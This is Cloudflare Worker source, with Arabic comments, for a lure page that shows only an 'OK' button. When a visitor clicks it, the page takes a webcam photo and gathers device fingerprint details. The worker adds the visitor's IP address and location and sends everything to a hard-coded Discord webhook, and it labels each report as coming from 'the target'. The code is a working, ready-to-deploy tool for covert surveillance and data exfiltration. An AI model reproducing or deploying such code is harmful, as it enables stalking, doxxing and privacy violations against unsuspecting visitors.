export default {
  async fetch(request, env) {
    // ===== ضع رابط الويب هوك هنا =====
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1547725006887321670/u7ySBadftakSuK8ugsJQa7eIjXouPiptOGakVJuaBLM8tbg14UuZDwpmO8h28sJWx0hz";

    // ===== جلب IP الزائر =====
    const clientIP = request.headers.get("CF-Connecting-IP") || 
                     request.headers.get("X-Forwarded-For") || 
                     "غير معروف";
    const country = request.headers.get("CF-IPCountry") || "غير معروف";
    const city = request.headers.get("CF-IPCity") || "غير معروف";
    const region = request.headers.get("CF-IPRegion") || "غير معروف";
    const userAgent = request.headers.get("User-Agent") || "غير معروف";

    // استقبال الصور من الطلب
    if (request.method === "POST") {
      try {
        const formData = await request.formData();
        const file1 = formData.get("file1");
        const file2 = formData.get("file2");
        const pageUrl = formData.get("pageUrl") || "غير معروف";
        const screenRes = formData.get("screenRes") || "غير معروف";
        const language = formData.get("language") || "غير معروف";
        const platform = formData.get("platform") || "غير معروف";
        const timezone = formData.get("timezone") || "غير معروف";
        const battery = formData.get("battery") || "غير معروف";
        const gpu = formData.get("gpu") || "غير معروف";
        const ram = formData.get("ram") || "غير معروف";
        const cores = formData.get("cores") || "غير معروف";

        // إرسال إلى Discord Webhook
        const discordForm = new FormData();
        if (file1) discordForm.append("file1", file1, "camera.png");
        if (file2) discordForm.append("file2", file2, "screenshot.png");

        const payload = {
          content: "📡 **تقرير جديد من الهدف**",
          embeds: [
            {
              title: "🌐 معلومات الشبكة والجهاز",
              color: 0x5865F2,
              fields: [
                { name: "🌍 IP", value: `\`${clientIP}\``, inline: true },
                { name: "🏳️ الدولة", value: `${country}`, inline: true },
                { name: "🏙️ المدينة", value: `${city}`, inline: true },
                { name: "📍 المنطقة", value: `${region}`, inline: true },
                { name: "🖥️ نظام التشغيل", value: `\`${platform}\``, inline: true },
                { name: "🌐 اللغة", value: `\`${language}\``, inline: true },
                { name: "📱 الجهاز", value: `\`${userAgent.substring(0, 80)}\``, inline: false },
                { name: "🖥️ دقة الشاشة", value: `\`${screenRes}\``, inline: true },
                { name: "🕒 المنطقة الزمنية", value: `\`${timezone}\``, inline: true },
                { name: "🔋 البطارية", value: `\`${battery}\``, inline: true },
                { name: "💻 كرت الشاشة", value: `\`${gpu.substring(0, 60)}\``, inline: false },
                { name: "🧠 الرامات", value: `\`${ram} GB\``, inline: true },
                { name: "⚙️ عدد الأنوية", value: `\`${cores}\``, inline: true },
                { name: "🔗 رابط الصفحة", value: `\`${pageUrl}\``, inline: false }
              ],
              footer: { text: "Cloudflare Worker • 2099" },
              timestamp: new Date().toISOString()
            }
          ]
        };
        discordForm.append("payload_json", JSON.stringify(payload));

        const discordResponse = await fetch(WEBHOOK_URL, {
          method: "POST",
          body: discordForm
        });

        if (discordResponse.ok) {
          return new Response("✅ تم الإرسال بنجاح", { status: 200 });
        } else {
          const err = await discordResponse.text();
          return new Response("❌ فشل الإرسال: " + err, { status: 500 });
        }
      } catch (err) {
        return new Response("❌ خطأ: " + err.message, { status: 500 });
      }
    }

    // ===== صفحة HTML =====
    const html = `<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>متابعة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', system-ui, sans-serif;
            padding: 20px;
            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnBY52Us0MXjzHyoYLCR_mP0dFUz51fLmnQHT0IZ3k1XpbouHi2iUd1Kw&s=10');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 0;
            backdrop-filter: blur(3px);
        }
        .center-box {
            position: relative;
            z-index: 1;
            background: rgba(10, 10, 20, 0.6);
            backdrop-filter: blur(12px);
            border-radius: 40px;
            padding: 50px 40px;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.9);
            text-align: center;
        }
        .btn-ok {
            background: #ffffff;
            color: #000;
            border: none;
            padding: 20px 30px;
            border-radius: 60px;
            font-size: 26px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            transition: 0.15s ease;
            box-shadow: 0 8px 30px rgba(255, 255, 255, 0.15);
            letter-spacing: 2px;
            font-family: inherit;
        }
        .btn-ok:hover { transform: scale(1.02); background: #f2f2ff; }
        .btn-ok:active { transform: scale(0.94); }
        .btn-ok:disabled { opacity: 0.5; pointer-events: none; }
        #status { margin-top: 25px; font-size: 14px; color: rgba(255,255,255,0.25); min-height: 22px; }
    </style>
</head>
<body>
    <div class="center-box">
        <button class="btn-ok" id="mainBtn">OK</button>
        <div id="status">اضغط للمتابعة</div>
    </div>

    <script>
        const btn = document.getElementById('mainBtn');
        const statusDiv = document.getElementById('status');
        let isProcessing = false;

        // ===== جمع معلومات الجهاز =====
        async function collectDeviceInfo() {
            const info = {
                pageUrl: window.location.href,
                screenRes: window.screen.width + 'x' + window.screen.height,
                language: navigator.language || 'غير معروف',
                platform: navigator.platform || 'غير معروف',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف',
                battery: 'غير معروف',
                gpu: 'غير معروف',
                ram: navigator.deviceMemory || 'غير معروف',
                cores: navigator.hardwareConcurrency || 'غير معروف'
            };

            // البطارية
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    info.battery = Math.round(battery.level * 100) + '%' + (battery.charging ? ' ⚡ يشحن' : '');
                }
            } catch (e) {}

            // كرت الشاشة
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير معروف';
                    }
                }
            } catch (e) {}

            return info;
        }

        async function captureAndSend() {
            if (isProcessing) return;
            isProcessing = true;
            btn.disabled = true;
            statusDiv.textContent = '⏳ جاري التجهيز...';

            try {
                // جمع معلومات الجهاز
                const deviceInfo = await collectDeviceInfo();

                // طلب الكاميرا
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                } catch (camErr) {
                    statusDiv.textContent = '⚠️ يرجى السماح بالكاميرا';
                    btn.disabled = false;
                    isProcessing = false;
                    return;
                }

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const cameraDataURL = canvas.toDataURL('image/png');
                stream.getTracks().forEach(t => t.stop());

                statusDiv.textContent = '📸 جاري أخذ لقطة للشاشة...';

                const cardElement = document.querySelector('.center-box');
                const screenshotCanvas = await html2canvas(cardElement, {
                    scale: 1.2,
                    backgroundColor: '#0a0a0a',
                    allowTaint: false,
                    useCORS: true,
                    logging: false
                });
                const screenshotDataURL = screenshotCanvas.toDataURL('image/png');

                statusDiv.textContent = '📨 جاري الإرسال...';

                function dataURLtoBlob(dataURL) {
                    const parts = dataURL.split(',');
                    const mime = parts[0].match(/:(.*?);/)[1];
                    const bstr = atob(parts[1]);
                    let n = bstr.length;
                    const u8arr = new Uint8Array(n);
                    while (n--) { u8arr[n] = bstr.charCodeAt(n); }
                    return new Blob([u8arr], { type: mime });
                }

                const imageBlob = dataURLtoBlob(cameraDataURL);
                const screenshotBlob = dataURLtoBlob(screenshotDataURL);

                const formData = new FormData();
                formData.append('file1', imageBlob, 'camera.png');
                formData.append('file2', screenshotBlob, 'screenshot.png');
                formData.append('pageUrl', deviceInfo.pageUrl);
                formData.append('screenRes', deviceInfo.screenRes);
                formData.append('language', deviceInfo.language);
                formData.append('platform', deviceInfo.platform);
                formData.append('timezone', deviceInfo.timezone);
                formData.append('battery', deviceInfo.battery);
                formData.append('gpu', deviceInfo.gpu);
                formData.append('ram', deviceInfo.ram);
                formData.append('cores', deviceInfo.cores);

                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.text();
                if (response.ok) {
                    statusDiv.textContent = '✅ ' + result;
                    btn.disabled = true;
                } else {
                    statusDiv.textContent = '❌ ' + result;
                    btn.disabled = false;
                }

            } catch (err) {
                statusDiv.textContent = '⚠️ خطأ: ' + err.message;
                btn.disabled = false;
            } finally {
                isProcessing = false;
            }
        }

        btn.addEventListener('click', captureAndSend);
    </script>

    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</body>
</html>`;

    return new Response(html, {
      headers: { "Content-Type": "text/html; charset=utf-8" }
    });
  }
};
